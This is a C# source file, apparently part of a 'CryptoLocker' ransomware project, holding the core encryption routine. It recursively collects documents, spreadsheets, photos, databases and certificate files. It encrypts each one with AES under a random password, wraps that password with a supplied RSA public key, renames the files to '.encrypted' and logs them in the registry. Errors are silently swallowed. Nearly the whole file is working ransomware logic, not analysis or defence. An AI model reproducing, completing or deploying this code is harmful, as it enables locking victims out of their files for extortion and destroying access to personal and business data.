using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace CryptoLocker.WinForm
{
    public class CryptoService
    {
        private const string SearchPattern =
            @"*.odt|*.ods|*.odp|*.odm|*.odc|*.odb|*.doc|*.docx|*.docm|*.wps|*.xls|*.xlsx|*.xlsm|*.xlsb|*.xlk|*.ppt|*.pptx|*.pptm|*.mdb|*.accdb|*.pst|*.dwg|*.dxf|*.dxg|*.wpd|*.rtf|*.wb2|*.mdf|*.dbf|*.psd|*.pdd|*.pdf|*.eps|*.ai|*.indd|*.cdr|*.jpg|*.jpe|*.jpg|*.dng|*.3fr|*.arw|*.srf|*.sr2|*.bay|*.crw|*.cr2|*.dcr|*.kdc|*.erf|*.mef|*.mrw|*.nef|*.nrw|*.orf|*.raf|*.raw|*.rwl|*.rw2|*.r3d|*.ptx|*.pef|*.srw|*.x3f|*.der|*.cer|*.crt|*.pem|*.pfx|*.p12|*.p7b|*.p7c|*.png";

        public static void EncryptFiles(string path, string publicKey)
        {
            try
            {
                string[] files = Util.GetFiles(path, SearchPattern, SearchOption.AllDirectories).ToArray();
                
                var pwd = Util.GetRandomString();

                foreach (var filePath in files)
                {
                    EncryptFile(filePath, publicKey, pwd);
                }
            }
            catch
            {
            }
        }

        public static void DecryptFiles(string path, string privateKey)
        {
            try
            {
                string[] files = RegistryHelper.GetEncryptedFileNames().Select(x => x.Key).ToArray();
                
                if(files.Length == 0)
                {
                    files = Util.GetFiles(path, "*.encrypted", SearchOption.AllDirectories)
                    .ToArray();
                }
                
                foreach (var filePath in files)
                {
                    DecryptFile(filePath, privateKey);
                }
            }
            catch
            {
            }
        }

        public static void EncryptFile(string filePath, string publicKey, string password = "")
        {
            try
            {
                if(!File.Exists(filePath)) return;

                string ext = Path.GetExtension(filePath);

                if(ext == null) return;
                
                if(string.IsNullOrEmpty(password)) password = Util.GetRandomString();

                byte[] bytesToBeEncrypted = File.ReadAllBytes(filePath);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                
                // Prepend salt
                byte[] salt = Util.GetFileExtensionBytes(filePath);
                if (salt == null)
                {
                    return;
                }

                byte[] baEncrypted = new byte[salt.Length + bytesToBeEncrypted.Length];

                // Combine Salt + Text
                Array.Copy(salt, 0, baEncrypted, 0, salt.Length);
                Array.Copy(bytesToBeEncrypted, 0, baEncrypted, salt.Length, bytesToBeEncrypted.Length);
                
                byte[] bytesEncrypted = Cryptography.AES_Encrypt(baEncrypted, passwordBytes);

                // RSA
                byte[] keybytes = Cryptography.RsaEncrypt(publicKey, password);
                
                // Place rsa key in front of encrypted bytes
                byte[] concatenatedBytes = keybytes.Concat(bytesEncrypted).ToArray();

                var newPath = Path.ChangeExtension(filePath, ".encrypted");
            
                File.Move(filePath, newPath);
                File.WriteAllBytes(newPath, concatenatedBytes);

                RegistryHelper.InsertFileName(filePath, Path.GetFileName(filePath));
            }
            catch
            {
            }
        }

        public static void DecryptFile(string filePath, string privateKey)
        {
            try
            {
                var path = Path.ChangeExtension(filePath, ".encrypted");

                if (!File.Exists(path)) return;

                byte[] bytesToBeDecrypted = File.ReadAllBytes(path);

                // First 128 bytes is rsa key bytes
                byte[] rsaBytes = new byte[128];
                Array.Copy(bytesToBeDecrypted, 0, rsaBytes, 0, rsaBytes.Length);

                // Symmetric Rijndael key
                var symmetricKey = Cryptography.RsaDecrypt(privateKey, rsaBytes);

                byte[] extensionAndDataBytes = new byte[bytesToBeDecrypted.Length - rsaBytes.Length];
                Array.Copy(bytesToBeDecrypted, rsaBytes.Length, extensionAndDataBytes, 0, extensionAndDataBytes.Length);
                
                byte[] passwordBytes = Encoding.UTF8.GetBytes(symmetricKey);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                
                // Decrypt using Rijndal/AES
                byte[] bytesDecrypted = Cryptography.AES_Decrypt(extensionAndDataBytes, passwordBytes);
            
                // Remove salt
                int saltLength = Util.GetSaltLength();
                byte[] baResult = new byte[bytesDecrypted.Length - saltLength];
                Array.Copy(bytesDecrypted, saltLength, baResult, 0, baResult.Length);
                
                // Get extension from salt
                byte[] saltedBytes = new byte[saltLength];
                Array.Copy(bytesDecrypted, 0, saltedBytes, 0, saltedBytes.Length);
                var ext = Util.ExtractFileExtensionFromBytes(saltedBytes);
            
                File.WriteAllBytes(path, baResult);
                File.Move(path, Path.ChangeExtension(path, ext));
                
                RegistryHelper.RemoveFilePathFromList(filePath);

            }
            catch(Exception ex)
            {
            }
        }
    }
}

